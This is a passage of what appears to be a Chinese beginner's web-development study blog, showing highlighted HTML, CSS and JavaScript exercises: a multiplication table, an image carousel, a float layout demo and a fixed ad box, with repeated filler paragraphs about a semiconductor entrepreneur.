y) &#123; return x - y &#125;) */</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// for (let i = 0; i &lt; selectedBalls.length; i += 1) &#123;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \tlet num = selectedBalls[i]</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \t// document - DOM - 文档对象模型</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \t// document.write(`&lt;p class=&quot;red&quot;&gt;$&#123;num&#125;&lt;/p&gt;`) /* ``(~键) 字符串占位符可折行*/</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \toutputBall(num)</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// &#125;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\tselectedBalls.<span class=\"title function_\">forEach</span>(<span class=\"function\"><span class=\"params\">item</span> =&gt;</span> <span class=\"title function_\">outputBall</span>(item)) </span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">/* function(item) &#123; outputBall(item) &#125; */</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"keyword\">let</span> num = <span class=\"built_in\">parseInt</span>(<span class=\"title class_\">Math</span>.<span class=\"title function_\">random</span>() * <span class=\"number\">16</span> + <span class=\"number\">1</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// document.write(`&lt;p class=&quot;blue&quot;&gt;$&#123;num&#125;&lt;/p&gt;`)</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"title function_\">outputBall</span>(num, <span class=\"string\">&#x27;blue&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"prctice1O-html\"><a href=\"#prctice1O-html\" class=\"headerlink\" title=\"prctice1O.html\"></a>prctice1O.html</h1><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>乘法口诀表<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-css\"></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-tag\">table</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">border</span>: <span class=\"number\">730px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">border-collapse</span>: collapse;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">margin</span>: <span class=\"number\">0</span> auto;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-tag\">td</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">border</span>: <span class=\"number\">1px</span> solid black;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">width</span>: <span class=\"number\">80px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">text-align</span>: center;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t</span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"variable language_\">document</span>.<span class=\"title function_\">write</span>(<span class=\"string\">`&lt;table&gt;`</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">1</span>; i &lt;= <span class=\"number\">9</span>; i += <span class=\"number\">1</span>) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"variable language_\">document</span>.<span class=\"title function_\">write</span>(<span class=\"string\">&#x27;&lt;tr&gt;&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> j = <span class=\"number\">1</span>; j &lt;= i; j += <span class=\"number\">1</span>) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"variable language_\">document</span>.<span class=\"title function_\">write</span>(<span class=\"string\">&#x27;&lt;td&gt;&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"variable language_\">document</span>.<span class=\"title function_\">write</span>(<span class=\"string\">`<span class=\"subst\">$&#123;j&#125;</span>&amp;times;<span class=\"subst\">$&#123;i&#125;</span>=<span class=\"subst\">$&#123;j * i&#125;</span>`</span>) <span class=\"comment\">/*&amp;times表示乘号*/</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"variable language_\">document</span>.<span class=\"title function_\">write</span>(<span class=\"string\">&#x27;&lt;/td&gt;&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"variable language_\">document</span>.<span class=\"title function_\">write</span>(<span class=\"string\">&#x27;&lt;/tr&gt;&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"variable language_\">document</span>.<span class=\"title function_\">write</span>(<span class=\"string\">`&lt;/table&gt;`</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"获取页面元素的方法-html\"><a href=\"#获取页面元素的方法-html\" class=\"headerlink\" title=\"获取页面元素的方法.html\"></a>获取页面元素的方法.html</h1><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>轮播广告<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-css\"></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-id\">#adv</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">width</span>: <span class=\"number\">600px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">margin</span>: <span class=\"number\">0</span> auto; <span class=\"comment\">/* 居中 */</span></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125; </span></span><br><span class=\"line\"><span class=\"language-css\">\t\t</span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;adv&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;../images/163057jyrg229qerdeciod.jpg&quot;</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;600&quot;</span> <span class=\"attr\">alt</span>=<span class=\"string\">&quot;&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// 获取img标签</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"keyword\">const</span> img = <span class=\"variable language_\">document</span>.<span class=\"title function_\">querySelector</span>(<span class=\"string\">&#x27;#adv&gt;img&#x27;</span>) <span class=\"comment\">/* ！！传样式表选择器, 返回HTMLElement */</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"keyword\">const</span> imageNames = [<span class=\"string\">&#x27;53a11f5bc8ae6.jpg&#x27;</span>, <span class=\"string\">&#x27;500e42eeab120.jpg&#x27;</span>, </span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"string\">&#x27;163057jyrg229qerdeciod.jpg&#x27;</span>, <span class=\"string\">&#x27;443121.jpg&#x27;</span>]</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"keyword\">var</span> imageIndex = <span class=\"number\">0</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"keyword\">function</span> <span class=\"title function_\">switchImage</span>(<span class=\"params\"></span>) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\timageIndex += <span class=\"number\">1</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\timageIndex %= imageNames.<span class=\"property\">length</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\timg.<span class=\"property\">src</span> = <span class=\"string\">&#x27;../images/&#x27;</span> + imageNames[imageIndex]</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"keyword\">var</span> timerId = <span class=\"built_in\">setInterval</span>(switchImage, <span class=\"number\">2000</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// const img = document.querySelectorAll(&#x27;#adv&gt;img&#x27;) --&gt;NodeList返回列表</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">/*</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">\t\t\tfirstChild / lastChild 会获取到文本节点（回车）/ children[i] 不会获取到文本节点，直接取到标签节点 -- 获取子节点</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">\t\t\tparentNode -- 获取父节点</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">\t\t\tpreviousSibling / nextSibling 会获取到文本节点（回车）/ previousElementSibling / nextElementSibling 不会获取到文本节点，直接取到标签节点  -- 获取相邻兄弟节点</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">\t\t\tconst img = document.getElementById(&#x27;adv&#x27;).children[0]</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">\t\t\talert(img.src)</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">\t\t\t*/</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t    <span class=\"comment\">// document.getElementsByClassName(&#x27;类名&#x27;) --&gt;返回列表</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// const img = document.getElementsByTag(&#x27;img&#x27;)[0]</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// const divList = document.getElementsByTagName(&#x27;div&#x27;) --&gt;传标签名，返回列表</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// const advImage = document.getElementById(&#x27;advImage&#x27;) /* ！！标识 */</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\timg.<span class=\"title function_\">addEventListener</span>(<span class=\"string\">&#x27;mouseover&#x27;</span>, <span class=\"function\">() =&gt;</span> <span class=\"built_in\">clearInterval</span>(timerId))</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\timg.<span class=\"title function_\">addEventListener</span>(<span class=\"string\">&#x27;mouseout&#x27;</span>, <span class=\"function\">() =&gt;</span> &#123; timerId= <span class=\"built_in\">setInterval</span>(switchImage, <span class=\"number\">2000</span>) &#125;)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"problem-of-float-html\"><a href=\"#problem-of-float-html\" class=\"headerlink\" title=\"problem_of_float.html\"></a>problem_of_float.html</h1><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Parent Float - Problem<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">style</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text/css&quot;</span>&gt;</span><span class=\"language-css\"></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-tag\">body</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">width</span>: <span class=\"number\">752px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">font-family</span>: Arial, Verdana, sans-serif;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">color</span>: <span class=\"number\">#665544</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"comment\">/* CSS hack */</span></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"comment\">/* 问题：因为p标签的浮动边框会变成一条线 */</span></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-class\">.container</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">border</span>: <span class=\"number\">1px</span> solid <span class=\"number\">#665544</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">overflow</span>: auto; <span class=\"comment\">/* 自适应边框*/</span></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-tag\">p</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">width</span>: <span class=\"number\">230px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">float</span>: left;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">margin</span>: <span class=\"number\">10px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t</span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>hello, world!<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;container&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t半导体产业也是一个高科技的产业，有很高的技术要求，况且在互联网的时代，半导体更是处于缺一不可的存在。在这个领域当中，尹志尧自己自创了60多项的技术专利，也被一致认为是硅谷最成功的中国人之一。</span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t在尹志尧创办中微半导体公司的时候，在创办前期就需要每年集资5000万美元来研发科学技术的问题，这对于很多人来说是一个天文数字，但半导体产业毕竟是一个高端的行业，如果不进行科研的话，那么就可能被时代所淘汰。</span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t即使在这么大的资金压力之下，尹志尧并没有害怕，而是选择了找投资方，来加大科研的力度。终于，在尹志尧的坚持下，中微半导体公司成功地研究出了一系列等离子刻蚀设备，并且离建造国际先进水平的半导体产业又更近一步。</span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">p</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;clear&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t但这个时候，美国政府就开始把针对的目光投向了尹志尧的中微半导体公司，还纵容美国各大半导体公司依次对尹志尧的中微半导体公司发起了法律诉讼，想要把中国的半导体产业扼杀在摇篮里。</span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t面对美国政府的限制，尹志尧的中微半导体公司也做好了一切的准备，尹志尧已经在国内外总共申请了1200多项半导体相关的专利，而且大部分是具有创新意识的发明专利，这一举措有效的保护了他们的知识产权，也让美国人意想不到。</span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t面对美国政府的限制，尹志尧的中微半导体公司也做好了一切的准备，尹志尧已经在国内外总共申请了1200多项半导体相关的专利，而且大部分是具有创新意识的发明专利，这一举措有效的保护了他们的知识产权，也让美国人意想不到。</span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t半导体产业也是一个高科技的产业，有很高的技术要求，况且在互联网的时代，半导体更是处于缺一不可的存在。在这个领域当中，尹志尧自己自创了60多项的技术专利，也被一致认为是硅谷最成功的中国人之一。</span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t在尹志尧创办中微半导体公司的时候，在创办前期就需要每年集资5000万美元来研发科学技术的问题，这对于很多人来说是一个天文数字，但半导体产业毕竟是一个高端的行业，如果不进行科研的话，那么就可能被时代所淘汰。</span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t   <span class=\"comment\">&lt;!-- &lt;div style=&quot;clear: both;&quot;&gt;&lt;/div&gt; --&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"article-html\"><a href=\"#article-html\" class=\"headerlink\" title=\"article.html\"></a>article.html</h1><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Document<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-css\"></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-tag\">h1</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">margin-left</span>: <span class=\"number\">100px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-tag\">p</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">margin</span>: <span class=\"number\">40px</span> <span class=\"number\">120px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-id\">#adv</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">width</span>: <span class=\"number\">200px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">height</span>: <span class=\"number\">200px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">color</span>: yellow;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">background-color</span>: blue;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">position</span>: fixed;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">right</span>: <span class=\"number\">50px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">top</span>: <span class=\"number\">100px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"comment\">/* position属性的取值 */</span></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"comment\">/* 1.static - 静态定位 - 正常的文档流 */</span></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"comment\">/* 2.relative - 相对定位 - 相对于原来正常的位置 */</span></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"comment\">/* 3.absolute - 绝对定位 - 相对于父元素来设置位置 */</span></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"comment\">/* 4.fixed - 固定定位 - 相对于浏览器窗口来设置位置 */</span></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"comment\">/* .p2 &#123;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-css\">\t\t\t\tposition: fixed;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-css\">\t\t\t\tleft: 50px;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-css\">\t\t\t\ttop: 20px;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-css\">\t\t\t&#125;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-css\">\t\t\t*/</span></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t</span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;adv&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t此广告位招租</span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;closeBtn&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;float: right;&quot;</span>&gt;</span>关闭<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>hello, world!<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">hr</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t半导体产业也是一个高科技的产业，有很高的技术要求，况且在互联网的时代，半导体更是处于缺一不可的存在。在这个领域当中，尹志尧自己自创了60多项的技术专利，也被一致认为是硅谷最成功的中国人之一。</span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">p</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;p2&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t在尹志尧创办中微半导体公司的时候，在创办前期就需要每年集资5000万美元来研发科学技术的问题，这对于很多人来说是一个天文数字，但半导体产业毕竟是一个高端的行业，如果不进行科研的话，那么就可能被时代所淘汰。</span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t即使在这么大的资金压力之下，尹志尧并没有害怕，而是选择了找投资方，来加大科研的力度。终于，在尹志尧的坚持下，中微半导体公司成功地研究出了一系列等离子刻蚀设备，并且离建造国际先进水平的半导体产业又更近一步。</span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t即使在这么大的资金压力之下，尹志尧并没有害怕，而是选择了找投资方，来加大科研的力度。终于，在尹志尧的坚持下，中微半导体公司成功地研究出了一系列等离子刻蚀设备，并且离建造国际先进水平的半导体产业又更近一步。</span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;bar&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span 